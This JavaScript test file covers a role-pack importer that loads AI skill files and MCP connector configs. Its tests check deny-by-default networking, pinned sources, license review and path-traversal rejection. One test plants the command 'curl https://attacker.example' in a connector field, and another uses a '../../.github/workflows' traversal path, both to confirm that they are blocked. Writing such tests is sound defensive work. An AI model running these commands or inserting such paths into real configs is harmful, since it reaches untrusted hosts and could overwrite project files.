import test from "node:test";
import assert from "node:assert/strict";
import { compileCapability, CapabilityValidationError } from "../src/index.js";
import { importRolePack, inspectRolePack, parseRoleSkill } from "../src/role-pack.js";

const fixture = () => ({
  source: {
    url: "https://github.com/anthropics/knowledge-work-plugins",
    commit: "33eeda1e8fd856455b05479d13a0f85b5f803744",
    license: "Apache-2.0",
    observedAt: "2026-10-18T22:00:00Z"
  },
  manifest: { name: "marketing", version: "1.2.0", description: "Safe role-specific review workflows" },
  skills: [
    { path: "marketing/skills/claim-review/SKILL.md", contents: "---\nname: claim-review\ndescription: Review claims against submitted evidence.\nargument-hint: \"<draft>\"\n---\n\nReview the supplied draft. Flag unsupported claims; never publish." },
    { path: "marketing/skills/campaign-brief/SKILL.md", contents: "---\nname: campaign-brief\ndescription: Produce an original campaign plan.\n---\n\nProduce a draft plan from approved facts only." }
  ],
  mcpConfig: { mcpServers: { approved: { type: "http", url: "https://mcp.example.com/api" }, placeholder: { type: "http", url: "" }, local: { command: "never-execute" } } }
});

test("inspects upstream-shaped role pack without activating connectors", () => {
  const observed = inspectRolePack(fixture());
  assert.deepEqual(observed.skills.map(s => s.name), ["claim-review", "campaign-brief"]);
  assert.equal(observed.connectors.length, 3);
  assert.ok(observed.connectors.every(c => c.status === "disabled-unreviewed"));
  assert.equal(observed.policy.automaticInstall, false);
  assert.equal(observed.policy.network, "deny-by-default");
});

test("requires explicit instruction import approval", () => {
  assert.throws(() => importRolePack(fixture()), e => e instanceof CapabilityValidationError && e.code === "role_pack_instruction_approval_required");
});

test("imports stable pinned capabilities and supports harness compilation without connector access", () => {
  const run1 = importRolePack(fixture(), { approveInstructions: true });
  const run2 = importRolePack(fixture(), { approveInstructions: true });
  assert.deepEqual(run1.capabilities, run2.capabilities);
  for (const spec of run1.capabilities) {
    assert.equal(spec.provenance.sourceLicense, "Apache-2.0");
    assert.equal(spec.requirements.networkPolicy, "deny-by-default");
    assert.deepEqual(spec.requirements.tools, []);
    for (const harness of ["codex", "claude-code", "cursor"]) {
      const compiled = compileCapability(spec, harness);
      assert.match(compiled.receipt.receiptDigest, /^sha256:/);
      assert.equal(compiled.receipt.receiptDigest, compileCapability(spec, harness).receipt.receiptDigest);
    }
  }
});

test("rejects floating source refs and unreviewed licenses", () => {
  const a = fixture(); a.source.commit = "main";
  assert.throws(() => inspectRolePack(a), e => e.code === "role_pack_unpinned_source");
  const b = fixture(); b.source.license = "UNKNOWN";
  assert.throws(() => inspectRolePack(b), e => e.code === "role_pack_license_review_required");
});

test("rejects traversal, skill collisions and invalid frontmatter", () => {
  const a = fixture(); a.skills[0].path = "../../.github/workflows/publish.yml";
  assert.throws(() => inspectRolePack(a), e => e.code === "role_pack_skill_path_invalid");
  const b = fixture(); b.skills.push({ ...b.skills[0] });
  assert.throws(() => inspectRolePack(b), e => e.code === "role_pack_skill_duplicate");
  assert.throws(() => parseRoleSkill({ path: "marketing/skills/test/SKILL.md", contents: "No frontmatter" }, "marketing"), e => e.code === "role_pack_skill_frontmatter_missing");
});

test("does not import command/executable material through connector config", () => {
  const a = fixture();
  a.mcpConfig.mcpServers.local.command = "curl https://attacker.example";
  const converted = importRolePack(a, { approveInstructions: true });
  assert.ok(converted.capabilities.every(s => !JSON.stringify(s).includes("attacker.example")));
  assert.ok(converted.inventory.connectors.every(c => c.status === "disabled-unreviewed"));
});
